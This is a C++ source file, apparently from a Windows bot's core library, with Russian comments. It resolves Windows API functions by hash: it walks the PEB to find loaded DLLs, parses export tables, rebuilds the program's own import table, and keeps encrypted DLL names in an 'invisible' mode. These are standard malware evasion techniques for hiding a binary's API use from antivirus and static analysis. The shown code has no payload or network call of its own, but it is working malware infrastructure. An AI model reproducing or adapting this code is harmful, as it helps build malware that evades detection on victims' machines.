#include "core\winapi.h"
#include "core\string.h"
#include "core\pe.h"
#include "core\debug.h"
#include "core\memory.h"

#ifdef WINAPI_INVISIBLE

const int SizeHashTable = 640; //лучше всего задавать в 2 раза большее чем количество апи функций

const char* namesDll[] = 
{
	_CT_("kernel32.dll"), //KERNEL32 = 0
	_CT_("user32.dll"), //USER32 = 1
	_CT_("ntdll.dll"), //NTDLL = 2
	_CT_("shlwapi.dll"), //SHLWAPI = 3
	_CT_("iphlpapi.dll"), //IPHLPAPI = 4
	_CT_("urlmon.dll"), //URLMON = 5
	_CT_("ws2_32.dll"), //WS2_32 = 6
	_CT_("crypt32.dll"), //CRYPT32 = 7
	_CT_("shell32.dll"), //SHELL32 = 8
	_CT_("advapi32.dll"), //ADVAPI32 = 9
	_CT_("gdiplus.dll"), //GDIPLUS = 10
	_CT_("gdi32.dll"), //GDI32 = 11
	_CT_("ole32.dll"), //OLE32 = 12
	_CT_("psapi.dll"), //PSAPI = 13
	_CT_("cabinet.dll"), //CABINET = 14;
	_CT_("imagehlp.dll"), //IMAGEHLP = 15
	_CT_("netapi32.dll"), //NETAPI32 = 16
	_CT_("Wtsapi32.dll"),  //WTSAPI32 = 17
	_CT_("Mpr.dll"), //MPR = 18
	_CT_("WinHTTP.dll") //WINHTTP = 19
};

static HMODULE handlesDll[ sizeof(namesDll) / sizeof(char*) ];
static uint HashApiFuncsTable[SizeHashTable];
static void* AddrApiFuncsTable[SizeHashTable];

#endif

namespace WinAPI
{

typeGetProcAddress _GetProcAddress;
typeLoadLibraryA _LoadLibraryA;

bool Init()
{
	HMODULE kernel32;
	if ( (kernel32 = GetDllBase(hashKernel32)) == NULL )
		return false;
	_GetProcAddress = (typeGetProcAddress)GetApiAddr( kernel32, hashGetProcAddress );
	_LoadLibraryA = (typeLoadLibraryA)GetApiAddr( kernel32, hashLoadLibraryA );
	if ( (_GetProcAddress == NULL) || (_LoadLibraryA == NULL) )
		return false;

#ifdef WINAPI_INVISIBLE
	Mem::Set( handlesDll, 0, sizeof(handlesDll) );
	Mem::Set( HashApiFuncsTable, 0, sizeof(HashApiFuncsTable) );
	Mem::Set( AddrApiFuncsTable, 0, sizeof(AddrApiFuncsTable) );
	handlesDll[0] = kernel32;
#endif
	return true;
}


PPEB GetPEB()
{
#ifdef _WIN64
	return  (PPEB)__readgsqword(0x60);
#else
	PPEB PEB;
	__asm
	{
		mov eax, FS:[0x30]
		mov [PEB], eax
	}
	return PEB;
#endif
}

HMODULE GetDllBase( uint dllHash )
{    
	PPEB Peb = GetPEB();

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
	PLIST_ENTRY Entry = Head->Flink;

	while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		//конвертируем wchar_t в char
		char name[64];
		if( LdrData->BaseDllName.Length < sizeof(name) - 1 )
		{
			int i = 0; //в итоге тут будет длина имени длл
			while( LdrData->BaseDllName.Buffer[i] && i < sizeof(name) - 1 )
			{
				name[i] = (char)LdrData->BaseDllName.Buffer[i];
				i++;
			}
			name[i] = 0;
			Str::Upper(name);
			uint hash = Str::Hash( name, i );
			if( dllHash == hash )
			{
				return (HMODULE)LdrData->DllBase;
			}
		}
		Entry = Entry->Flink;
    }
	return nullptr;
}

void* GetApiAddr( HMODULE module, DWORD hashFunc )
{
	if( module == nullptr ) return nullptr;
	PIMAGE_OPTIONAL_HEADER poh = PE::GetOptionalHeader(module);
	// Получаем адрес таблицы експорта
	PIMAGE_EXPORT_DIRECTORY exportDir = (IMAGE_EXPORT_DIRECTORY*)RVATOVA( module, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    int exportSize = poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	int ordinal = -1; // Номер необходимой нам функции

	DWORD* namesTable  = (DWORD*)RVATOVA( module, exportDir->AddressOfNames );
	WORD*  ordinalTable =  (WORD*)RVATOVA( module, exportDir->AddressOfNameOrdinals );

	for( uint i = 0; i < exportDir->NumberOfNames; i++)
	{
		char* name = (char*)RVATOVA( module, *namesTable );
		if( Str::Hash(name) == hashFunc )
		{
			ordinal = *ordinalTable;
			break;
		}
		// следующая функция
		namesTable++;
		ordinalTable++;
	}

	//функция ненайдена
	if( ordinal < 0 )
		return nullptr;

	//Определяем адрес функции
	DWORD* addrTable  = (DWORD*)RVATOVA( module, exportDir->AddressOfFunctions );
	SIZE_T rva = addrTable[ordinal];

	SIZE_T addr = (SIZE_T)RVATOVA( module, rva );
	if( addr > (SIZE_T)exportDir && addr < (SIZE_T)exportDir + exportSize ) //перенаправление (NameDll.NameFunc)
	{
		char* s = (char*)addr;
		char nameDll[32];
		int i = 0;
		while( s[i] != '.' ) 
		{
			nameDll[i] = s[i];
			i++;
		}
		s += i + 1; //имя функции
		nameDll[i++] = '.';
		nameDll[i++] = 'd';
		nameDll[i++] = 'l';
		nameDll[i++] = 'l';
		nameDll[i] = 0;
		int num = 0;
		if( *s == '#' ) //номер функции
		{
			while( *++s ) num = num * 10 + *s - '0';
			s = (char*)&num;
		}
		HMODULE hdll = _LoadLibraryA(nameDll);
		return _GetProcAddress( hdll, s );
	}
	else
		return (void*)addr;
}

bool BuildImportTable( HMODULE imageBase, typeLoadLibraryA _LoadLibraryA, typeGetProcAddress _GetProcAddress )
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)&((byte*)(imageBase))[dosHeader->e_lfanew];
	PIMAGE_DATA_DIRECTORY directory = &headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if( directory->Size == 0 ) return true; //нет таблицы импорта
	if ( directory->Size > 0xffff ) return false;

	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((SIZE_T)imageBase + directory->VirtualAddress);

	for ( ; importDesc->Name; importDesc++ )
	{
		SIZE_T *thunkRef, *funcRef;
		LPCSTR nameDll = (LPCSTR)((SIZE_T)imageBase + importDesc->Name);
		HMODULE handle = _LoadLibraryA(nameDll);

		if( handle == NULL ) return false;

		if( importDesc->OriginalFirstThunk)
		{
			thunkRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->OriginalFirstThunk);
			funcRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
		} 
		else
		{
			thunkRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
			funcRef = (SIZE_T*)((SIZE_T)imageBase + (DWORD)importDesc->FirstThunk);
		}
		for (; *thunkRef; thunkRef++, funcRef++)
		{
			SIZE_T addr = 0;
			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
			{
				addr = (SIZE_T)_GetProcAddress( handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef) );
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)imageBase + *thunkRef);
				addr = (SIZE_T)_GetProcAddress( handle, (LPCSTR)&thunkData->Name );
			}
			if( addr )
			{
				if( addr != *funcRef )
					*funcRef = addr;
			}
			else
			{
				return false;
			}
		}
	}
	return true;
}


bool InitBotImportTable()
{
	HMODULE imageBase = PE::GetImageBase();
	return BuildImportTable( imageBase, _LoadLibraryA, _GetProcAddress );
}

DWORD* GetImportAddr( HMODULE imageBase, uint hashFunc, IMAGE_OPTIONAL_HEADER *poh )
{
	if( poh == 0 ) poh = PE::GetOptionalHeader(imageBase);
	IMAGE_IMPORT_DESCRIPTOR* pi=(IMAGE_IMPORT_DESCRIPTOR*)((SIZE_T)imageBase + poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	
	for( ; pi->Name; pi++ )
	{
		DWORD* pimport;
		if( pi->TimeDateStamp == 0 )
			pimport = (DWORD*)((SIZE_T)imageBase + pi->FirstThunk);
		else
			pimport = (DWORD*)((SIZE_T)imageBase + pi->OriginalFirstThunk);
		
		DWORD* paddress = (DWORD*)((SIZE_T)imageBase + pi->FirstThunk);

		for( int i = 0; pimport[i]; i++ )
		{
			if( (pimport[i] & IMAGE_ORDINAL_FLAG32) == 0 ) //импорт по имени
			{		
				char* impName = (char*)((SIZE_T)imageBase + pimport[i] + 2);
				uint hashName = Str::Hash(impName);
				if( hashFunc == hashName )
					return &paddress[i];
			}
		}
	}
	return 0;
}

}

#ifdef WINAPI_INVISIBLE

void* GetApiAddrFunc( int dll, uint hashFunc )
{
	//используется закрытая хеш таблица
	int n = hashFunc % SizeHashTable;
	while( HashApiFuncsTable[n] )
	{
		if( HashApiFuncsTable[n] == hashFunc ) return AddrApiFuncsTable[n];
		n++;
		if( n >= SizeHashTable ) n = 0;
	}
	//еще не инициализирована данная функция
	HMODULE hdll = handlesDll[dll];
	void* func = 0;
	if( !hdll )
	{
		hdll = WinAPI::_LoadLibraryA( DECODE_STRING( namesDll[dll] ) );
#ifdef DEBUG_STRINGS
		if( hdll == 0 )
		{
			OutputDebugStringA( "Not load dll library ..." );
			OutputDebugStringA( DECODE_STRING( namesDll[dll] ) );
			char buf[16];
			wsprintfA( buf, "Error %d", GetLastError() );
			OutputDebugStringA(buf);
		}
#endif
		handlesDll[dll] = hdll;
	}
	if( hdll )
	{
		func = WinAPI::GetApiAddr( hdll, hashFunc );
#ifdef DEBUG_STRINGS
		if( !func )
		{
			OutputDebugStringA( "Not load func for hash ..." );
			char buf[16];
			wsprintfA( buf, "%08x", hashFunc );
			OutputDebugStringA(buf);
		}
#endif
	}
	HashApiFuncsTable[n] = hashFunc;
	AddrApiFuncsTable[n] = func;
	return func;
}

#endif
